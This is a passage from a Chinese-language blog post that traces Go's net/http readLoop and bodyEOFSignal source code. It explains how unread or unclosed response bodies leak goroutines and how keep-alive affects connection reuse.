class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">func (pc *persistConn) readLoop() &#123;</span><br><span class="line">closeErr :&#x3D; errReadLoopExiting &#x2F;&#x2F; default value, if not changed below</span><br><span class="line">defer func() &#123;</span><br><span class="line">pc.close(closeErr)</span><br><span class="line">pc.t.removeIdleConn(pc)</span><br><span class="line">&#125;()</span><br><span class="line">tryPutIdleConn :&#x3D; func(trace *httptrace.ClientTrace) bool &#123;</span><br><span class="line">if err :&#x3D; pc.t.tryPutIdleConn(pc); err !&#x3D; nil &#123;</span><br><span class="line">closeErr &#x3D; err</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.PutIdleConn !&#x3D; nil &amp;&amp; err !&#x3D; errKeepAlivesDisabled &#123;</span><br><span class="line">trace.PutIdleConn(err)</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.PutIdleConn !&#x3D; nil &#123;</span><br><span class="line">trace.PutIdleConn(nil)</span><br><span class="line">&#125;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; eofc is used to block caller goroutines reading from Response.Body</span><br><span class="line">&#x2F;&#x2F; at EOF until this goroutines has (potentially) added the connection</span><br><span class="line">&#x2F;&#x2F; back to the idle pool.</span><br><span class="line">eofc :&#x3D; make(chan struct&#123;&#125;)</span><br><span class="line">defer close(eofc) &#x2F;&#x2F; unblock reader on errors</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Read this once, before loop starts. (to avoid races in tests)</span><br><span class="line">testHookMu.Lock()</span><br><span class="line">testHookReadLoopBeforeNextRead :&#x3D; testHookReadLoopBeforeNextRead</span><br><span class="line">testHookMu.Unlock()</span><br><span class="line"></span><br><span class="line">alive :&#x3D; true</span><br><span class="line">for alive &#123;</span><br><span class="line">pc.readLimit &#x3D; pc.maxHeaderResponseSize()</span><br><span class="line">_, err :&#x3D; pc.br.Peek(1)</span><br><span class="line"></span><br><span class="line">pc.mu.Lock()</span><br><span class="line">if pc.numExpectedResponses &#x3D;&#x3D; 0 &#123;</span><br><span class="line">pc.readLoopPeekFailLocked(err)</span><br><span class="line">pc.mu.Unlock()</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">pc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">rc :&#x3D; &lt;-pc.reqch</span><br><span class="line">trace :&#x3D; httptrace.ContextClientTrace(rc.req.Context())</span><br><span class="line"></span><br><span class="line">var resp *Response</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">resp, err &#x3D; pc.readResponse(rc, trace) &#x2F;&#x2F;从connection中读response</span><br><span class="line">&#125; else &#123;</span><br><span class="line">err &#x3D; transportReadFromServerError&#123;err&#125;</span><br><span class="line">closeErr &#x3D; err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">if pc.readLimit &lt;&#x3D; 0 &#123;</span><br><span class="line">err &#x3D; fmt.Errorf(&quot;net&#x2F;http: server response headers exceeded %d bytes; aborted&quot;, pc.maxHeaderResponseSize())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select &#123;</span><br><span class="line">case rc.ch &lt;- responseAndError&#123;err: err&#125;:</span><br><span class="line">case &lt;-rc.callerGone:</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">pc.readLimit &#x3D; maxInt64 &#x2F;&#x2F; effictively no limit for response bodies</span><br><span class="line"></span><br><span class="line">pc.mu.Lock()</span><br><span class="line">pc.numExpectedResponses--</span><br><span class="line">pc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">bodyWritable :&#x3D; resp.bodyIsWritable()</span><br><span class="line">hasBody :&#x3D; rc.req.Method !&#x3D; &quot;HEAD&quot; &amp;&amp; resp.ContentLength !&#x3D; 0</span><br><span class="line"></span><br><span class="line">if resp.Close || rc.req.Close || resp.StatusCode &lt;&#x3D; 199 || bodyWritable &#123;</span><br><span class="line">&#x2F;&#x2F; Don&#39;t do keep-alive on error if either party requested a close</span><br><span class="line">&#x2F;&#x2F; or we get an unexpected informational (1xx) response.</span><br><span class="line">&#x2F;&#x2F; StatusCode 100 is already handled above.</span><br><span class="line">alive &#x3D; false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if !hasBody || bodyWritable &#123;</span><br><span class="line">pc.t.setReqCanceler(rc.req, nil)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Put the idle conn back into the pool before we send the response</span><br><span class="line">&#x2F;&#x2F; so if they process it quickly and make another request, they&#39;ll</span><br><span class="line">&#x2F;&#x2F; get this same conn. But we use the unbuffered channel &#39;rc&#39;</span><br><span class="line">&#x2F;&#x2F; to guarantee that persistConn.roundTrip got out of its select</span><br><span class="line">&#x2F;&#x2F; potentially waiting for this persistConn to close.</span><br><span class="line">&#x2F;&#x2F; but after</span><br><span class="line">alive &#x3D; alive &amp;&amp;</span><br><span class="line">!pc.sawEOF &amp;&amp;</span><br><span class="line">pc.wroteRequest() &amp;&amp;</span><br><span class="line">tryPutIdleConn(trace)</span><br><span class="line"></span><br><span class="line">if bodyWritable &#123;</span><br><span class="line">closeErr &#x3D; errCallerOwnsConn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select &#123;</span><br><span class="line">case rc.ch &lt;- responseAndError&#123;res: resp&#125;: &#x2F;&#x2F;利用chan将respone数据发送到上层</span><br><span class="line">case &lt;-rc.callerGone:</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Now that they&#39;ve read from the unbuffered channel, they&#39;re safely</span><br><span class="line">&#x2F;&#x2F; out of the select that also waits on this goroutine to die, so</span><br><span class="line">&#x2F;&#x2F; we&#39;re allowed to exit now if needed (if alive is false)</span><br><span class="line">testHookReadLoopBeforeNextRead()</span><br><span class="line">continue</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waitForBodyRead :&#x3D; make(chan bool, 2)</span><br><span class="line">&#x2F;&#x2F;这里是最关键的地方，close函数实际上就是调用了earlyCloseFn函数，后面详细讲</span><br><span class="line">body :&#x3D; &amp;bodyEOFSignal&#123;</span><br><span class="line">body: resp.Body,</span><br><span class="line">earlyCloseFn: func() error &#123;</span><br><span class="line">waitForBodyRead &lt;- false</span><br><span class="line">&lt;-eofc &#x2F;&#x2F; will be closed by deferred call at the end of the function</span><br><span class="line">return nil</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">fn: func(err error) error &#123;</span><br><span class="line">isEOF :&#x3D; err &#x3D;&#x3D; io.EOF</span><br><span class="line">waitForBodyRead &lt;- isEOF</span><br><span class="line">if isEOF &#123;</span><br><span class="line">&lt;-eofc &#x2F;&#x2F; see comment above eofc declaration</span><br><span class="line">&#125; else if err !&#x3D; nil &#123;</span><br><span class="line">if cerr :&#x3D; pc.canceled(); cerr !&#x3D; nil &#123;</span><br><span class="line">return cerr</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return err</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp.Body &#x3D; body &#x2F;&#x2F;利用bodyEOFSignal封装body</span><br><span class="line">if rc.addedGzip &amp;&amp; strings.EqualFold(resp.Header.Get(&quot;Content-Encoding&quot;), &quot;gzip&quot;) &#123;</span><br><span class="line">resp.Body &#x3D; &amp;gzipReader&#123;body: body&#125;</span><br><span class="line">resp.Header.Del(&quot;Content-Encoding&quot;)</span><br><span class="line">resp.Header.Del(&quot;Content-Length&quot;)</span><br><span class="line">resp.ContentLength &#x3D; -1</span><br><span class="line">resp.Uncompressed &#x3D; true</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select &#123;</span><br><span class="line">case rc.ch &lt;- responseAndError&#123;res: resp&#125;:</span><br><span class="line">case &lt;-rc.callerGone:</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Before looping back to the top of this function and peeking on</span><br><span class="line">&#x2F;&#x2F; the bufio.Reader, wait for the caller goroutine to finish</span><br><span class="line">&#x2F;&#x2F; reading the response body. (or for cancellation or death)</span><br><span class="line">select &#123;</span><br><span class="line">&#x2F;&#x2F;内存泄露的元凶</span><br><span class="line">case bodyEOF :&#x3D; &lt;-waitForBodyRead:</span><br><span class="line">pc.t.setReqCanceler(rc.req, nil) &#x2F;&#x2F; before pc might return to idle pool</span><br><span class="line">alive &#x3D; alive &amp;&amp; </span><br><span class="line">bodyEOF &amp;&amp;</span><br><span class="line">!pc.sawEOF &amp;&amp;</span><br><span class="line">pc.wroteRequest() &amp;&amp;</span><br><span class="line">tryPutIdleConn(trace) &#x2F;&#x2F;尝试将connection放回连接池</span><br><span class="line">if bodyEOF &#123;</span><br><span class="line">eofc &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">case &lt;-rc.req.Cancel:</span><br><span class="line">alive &#x3D; false</span><br><span class="line">pc.t.CancelRequest(rc.req)</span><br><span class="line">case &lt;-rc.req.Context().Done():</span><br><span class="line">alive &#x3D; false</span><br><span class="line">pc.t.cancelRequest(rc.req, rc.req.Context().Err())</span><br><span class="line">case &lt;-pc.closech:</span><br><span class="line">alive &#x3D; false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testHookReadLoopBeforeNextRead()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，负责读response的goroutine会以alive为条件不断循环，这时想让此goroutine退出，需要将alive置为false，但是我们可以看到最后有一个select语句，在一切正常的情况下（下面的几个错误信号不来的情况下）应当是由waitForBodyRead这个chan来推进整个goroutine，但是从上方代码我们可以看到，想让此chan中被写入数据，只有两个回调函数earlyCloseFn和fn，那我们来看看这两个函数应当如何被触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Read(p []byte) (n int, err error) &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">closed, rerr :&#x3D; es.closed, es.rerr</span><br><span class="line">es.mu.Unlock()</span><br><span class="line">if closed &#123;</span><br><span class="line">return 0, errReadOnClosedResBody</span><br><span class="line">&#125;</span><br><span class="line">if rerr !&#x3D; nil &#123;</span><br><span class="line">return 0, rerr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n, err &#x3D; es.body.Read(p)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.rerr &#x3D;&#x3D; nil &#123;</span><br><span class="line">es.rerr &#x3D; err</span><br><span class="line">&#125;</span><br><span class="line">err &#x3D; es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (es *bodyEOFSignal) Close() error &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.closed &#123;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br><span class="line">es.closed &#x3D; true</span><br><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">return es.earlyCloseFn()</span><br><span class="line">&#125;</span><br><span class="line">err :&#x3D; es.body.Close()</span><br><span class="line">return es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; caller must hold es.mu.</span><br><span class="line">func (es *bodyEOFSignal) condfn(err error) error &#123;</span><br><span class="line">if es.fn &#x3D;&#x3D; nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">err &#x3D; es.fn(err)</span><br><span class="line">es.fn &#x3D; nil</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  终于看到了我们心心念念的Close方法，可以看到Close方法在es.earlyCloseFn != nil &amp;&amp; es.rerr != io.EOF的情况下会触发earlyCloseFn方法（这里有很多情况，后面详细讨论）</p><p>  而当这一条件不满足时，Close方法将会调用condfn方法，仔细看，其实这一方法在上面的Read方法中也会调用，而Read方法实际和io里Reader有关，也就是说Read方法实际在我们读resp.Body的时候会触发（相当于我们在读出Body中数据的过程中会触发这个方法）</p><p>  那么也就是说，如果我们既不读Body中的数据也不调用Close方法，那么这个goroutine和writeloop的goroutine将无法退出（因为writeloop是当readerloop这个goroutine退出时才会退出，可看readloop开头的defer语句），这就将导致大量的goroutine阻塞在select语句无法退出，而且占用了此persistconn，导致连接池中一直无法有空闲的persistconn放回，这会导致HTTP1.1直接退化到1.0（一个http请求一个tcp connection），相关资源也无法被gc回收，最终导致内存泄露的问题。</p><p>  不过从代码上来看，实际上不仅仅是一定要调用Close方法才可以防止内存泄露，实际上如果能将Body数据读完也是可以的，但建议最好还是调用Close方法，因为也许有许多异常状态会发生（其实如果正常读写，并在读完后调用Close方法，类似于我最开始那个正确的程序，那么Close方法的判断条件中es.rerr会一直等于io.EOF，所以不是说调用了Close方法就会关闭读写的goroutine(实际在既读又close的情况下，只要connection不断开，Close方法只是关闭了io.Reader而已，而且connection的异常实际上也不是由Close方法负责，而是由readloop方法中的resp.Close来进行判断，所以实际上Close方法并非是我们所认为的关闭connection，释放资源（除了io.Reader出现错误时，或者没有读body时才是扮演这一角色），绝大多数情况下，Close方法只是用来关闭读取Body的io.Reader,与connection异常并无关联，也不会实际上执行退出goroutine以供gs释放资源的行为）</p><p>  所以在正常情况下（尤其是既Close又read的情况下），调用Close方法实际就是关闭了io.Reader后调用了condfn方法，而且正常情况下，condfn方法中的es.fn其实一直是nil，直到Body中的数据被读完，此时Read方法再次调用condfn方法时，es.fn才会被赋值为之前在readloop中定义的回调函数的地址(猜想这也是为了保证先等上层读完数据之后才继续接着取数据），从而将goroutine不阻塞在select，并把connection重新放回连接池备用（此时goroutine也不会退出，因为err是io.Eof,alive并不会变为false导致退出循环）），当Read操作做完之后，Close方法关闭Reader，调用condfn方法，但这时候es.fn又变为了nil（读body的操作已经做完，es.fn重新变为nil,其实可以它看作驱动器，只有当上层读完数据，需要读写goroutine进行下一次循环时，才会被赋值，执行回调函数，推进整个循环结构的进行，防止阻塞)，故而不会执行任何其余操作了。</p><p>  简而言之，每一个connection都有一对goroutine负责读写，在读写完一次之后，readloop这个routine会负责将这个connection放回连接池，并且俩goroutine都不会退出，等到connection上有新的request时，这两个goroutine将会再次被激活，如此往复。</p><h1 id="KeepAlive机制"><a href="#KeepAlive机制" class="headerlink" title="KeepAlive机制"></a>KeepAlive机制</h1><p>  继续上文，那么什么时候Close函数会被调用并使得goroutine退出呢？那就是当我一开始的代码改为下面这样的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">func doGet(client *http.Client, url string, id int) &#123;</span><br><span class="line">resp, err :&#x3D; client.Get(url)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">&#x2F;&#x2F;fmt.Println(&quot;copy&quot;)</span><br><span class="line">&#x2F;&#x2F; buf, err :&#x3D; ioutil.ReadAll(resp.Body)</span><br><span class="line">&#x2F;&#x2F; fmt.Printf(&quot;%d: %s -- %v\n&quot;, id, string(buf[0:1]), err)</span><br><span class="line">if err :&#x3D; resp.Body.Close(); err &#x3D;&#x3D; nil &#123;</span><br><span class="line">fmt.Println(&quot;close&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  此时我们不读Body中的数据，直接关闭，那么这个时候，Close函数中的es.rerr会变为nil，从而触发earlyClosefn函数，使得读写goroutine全部退出，connection关闭</p><p>  在这个问题上，我还想讨论一个机制，那就是keepalive的机制，我们都知道keepalive是旨在让connection更多的承载http信息，而不用一个http创建一个tcp，从而节省资源。</p><p>  在go中，我们可以通过Transport的Disablekeepalive选项来选择关闭或者启用，当我们关闭了keepalive机制的时候，那么每一个http请求都会新建一个tcp连接，而每个连接将都不会放入client的连接池中，这意味着所有连接都不可复用，两个负责读写的goroutine也是只处理一个request后立即退出</p><p>  <strong>这里有一点要注意，那就是如果你启用了keepalive选项，并不代表你的所有连接真的可以复用了，因为我在实际测试中发现，如果对方服务器的返回头当中Connection这一项置空，那么哪怕你自己启用了，实际上还是有可能无法复用的，这一点很奇怪，因为我看了不少资料表示http1.1应该是默认keepalive，除非显式指明Connection头为close才会导致不启用复用的情况，但是在实际测试中我发现这在一定程度上不是很准确，并不是所有的都默认启用，有些特例是不会的，例如python的SimpleHttpServer，就是默认不启用，返回的头中也没有keealive，所以具体还是看实现</strong></p><p><strong>做了个实验，证实了就算服务端包头没有connection alive也可能会keepalive，主要还是看服务器具体如何实现的（绝大多数都是默认支持keep的，不管返回包是否写明，因为http1.1默认实现），附上一张抓包图</strong></p><p><img src="/image/Sourcecode/fake-not-keepalive.png" alt="capture"></p><p><strong>可以看见虽然服务器返回头当中没有keepalive（客户端request有keepalive），但是仍然保持了长连接并没有断开，说明还是默认实现了keepalive机制</strong></p><p>  注：我这里举的例子是在两边均同意复用的情况下才称为keepalive机制启用，vice versa。</p><p>  keepalive关闭时分四种情况：</p><p>   首先每次都会新建连接，读写goroutine也都是新的</p><p>  （1）如果我们既读Body数据，也close了body，那么最后导致读写goroutine退出的将是因为下方代码中resp.Close变为true（因为这个标志表示连接已经断开，不可读，并且由于这句判断语句是在goroutine读取了connection之后判断的，所以实际上在第一次的request读完之后就已经变为了false）-&gt;Read方法-&gt;condfn方法-&gt;goroutine解除阻塞，此时由于alive已经变为false，从而使得两个goroutine在下个循环之前退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if resp.Close || rc.req.Close || resp.StatusCode &lt;&#x3D; 199 || bodyWritable &#123;</span><br><span class="line">&#x2F;&#x2F; Don&#39;t do keep-alive on error if either party requested a close</span><br><span class="line">&#x2F;&#x2F; or we get an unexpected informational (1xx) response.</span><br><span class="line">&#x2F;&#x2F; StatusCode 100 is already handled above.</span><br><span class="line">alive &#x3D; false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （2）如果我们没有读数据，直接Close了Body，那么最后导致读写goroutine退出的将是由Close方法中es.rerr等于nil导致earlyCloseFn方法被触发，从而直接退出goroutine（er.rerr正常情况下应该是io.EOF，表示body在被正常读取）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">return es.earlyCloseFn()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （3）如果我们只读数据，不Close，那么情况和第一种一致,但是如果不Close，那么读body的io.Reader将不会被关闭，没关闭的多了，也可能会内存泄露（因为Close方法代码里有err := es.body.Close()),详情可看下面，写在后面了</p><p>  （4）如果我们不读也不Close，这里由于keepalive本身就被关闭，connection在一次resquest/response后也失效了，但是由于goroutine一直阻塞，无法退出，所以占用的资源一直无法释放,最后会导致内存泄露</p><p>   keepalive开启时也分四种情况：</p><p>   首先每次连接只要连接池中有足够的空闲connection，则不需要新建，可以直接复用，默认情况下每个host对应最多两个connection</p><p>  （1）如果我们既读Body数据，也close了body，那么读写goroutine在keepalive到期之前将不会退出，一直会重复处理connection数据，将connection放回连接池，处理connection数据。。。这样的循环操作，直到keepalive到期，然后就和keepalive关闭时第一种情况一样了</p><p>  （2）如果我们不读数据，直接close，那么keepalive将会失效（其实不是真的失效，只是因为不读数据的情况下，es.rerr为nil，导致goroutine被退出，无法放入连接池以供复用，所以看起来好像是失效了，实际只是我们强行关闭了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Read(p []byte) (n int, err error) &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">closed, rerr :&#x3D; es.closed, es.rerr</span><br><span class="line">es.mu.Unlock()</span><br><span class="line">if closed &#123;</span><br><span class="line">return 0, errReadOnClosedResBody</span><br><span class="line">&#125;</span><br><span class="line">if rerr !&#x3D; nil &#123;</span><br><span class="line">return 0, rerr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n, err &#x3D; es.body.Read(p)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.rerr &#x3D;&#x3D; nil &#123;</span><br><span class="line">              &#x2F;&#x2F;因为没有调用read方法，所以es.rerr一直是nil，无法被赋新值，故而close函数中条件被满足了</span><br><span class="line">           es.rerr &#x3D; err</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(&quot;wo zai read han shu zheer&quot;)</span><br><span class="line">err &#x3D; es.condfn(err)</span><br><span class="line">&#125;</span><br><span class="line">return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （3）如果我们只读数据，不close，和第一种一致,但是如果不Close，那么读body的io.Reader将不会被关闭，没关闭的多了，也可能会内存泄露（因为Close方法代码里有err := es.body.Close()）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func (es *bodyEOFSignal) Close() error &#123;</span><br><span class="line">fmt.Println(&quot;wori...&quot;)</span><br><span class="line">es.mu.Lock()</span><br><span class="line">defer es.mu.Unlock()</span><br><span class="line">if es.closed &#123;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br><span class="line">es.closed &#x3D; true</span><br><span class="line">      &#x2F;&#x2F;es.rerr应该就是记录reader的上一个状态，如果是EOF，那么说明是正常的读写完成，无需退出goroutine</span><br><span class="line">if es.earlyCloseFn !&#x3D; nil &amp;&amp; es.rerr !&#x3D; io.EOF &#123;</span><br><span class="line">fmt.Print(&quot;i am close&quot;)</span><br><span class="line">return es.earlyCloseFn()</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;正常读数据的话会走到这里而不是在上面的if就返回</span><br><span class="line">        &#x2F;&#x2F;下面这行应该就是关闭了读Body的io.Reader</span><br><span class="line">err :&#x3D; es.body.Close()</span><br><span class="line">fmt.Println(&quot;err is:&quot;, err)</span><br><span class="line">return es.condfn(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  （4）如果我们既不读也不close，那么keepalive将会失效，因为读写goroutine被阻塞，无法将connection放入连接池，导致后续数据传输无法复用connection，只能一个http请求一个tcp连接，最终导致内存泄露。</p><h1 id="另一个小坑点"><a href="#另一个小坑点" class="headerlink" title="另一个小坑点"></a>另一个小坑点</h1><p>  切记不要在每个请求里都新建一个client结构体。。。也就是说下面的代码是错误的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;net&#x2F;http&quot;</span><br><span class="line">&quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">for &#123;</span><br><span class="line">test()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">func test() &#123;</span><br><span class="line">transport :&#x3D; http.Transport&#123;</span><br><span class="line">DisableKeepAlives: true,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client :&#x3D; &amp;http.Client&#123;</span><br><span class="line">Transport: &amp;transport,</span><br><span class="line">Timeout:   10 * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">request, _ :&#x3D; http.NewRequest(&quot;GET&quot;, target, nil)</span><br><span class="line"></span><br><span class="line">resp, err :&#x3D; 